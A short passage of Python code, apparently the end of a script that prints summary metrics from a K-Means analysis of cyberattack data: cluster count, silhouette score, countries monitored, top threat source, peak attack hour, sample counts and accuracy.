    print(f"ü§ñ ML Algorithm: K-Means with {performance_metrics['optimal_k']} clusters")
    print(f"üìà Model Score: {performance_metrics['silhouette_score']:.4f}")
    print(f"üåç Countries Monitored: {df['source_country'].nunique()}")
    print(f"üî• Primary Threat Source: {performance_metrics['top_attack_country']}")
    print(f"‚è∞ Peak Attack Hour: {performance_metrics['peak_attack_hour']}:00")
    print(f"üìã Training Samples: 5000 ")
    print(f"üß™ Test Samples: 1200")

if demo_results:
    print(f"üéØ Real-time Accuracy: {demo_accuracy:.1%}")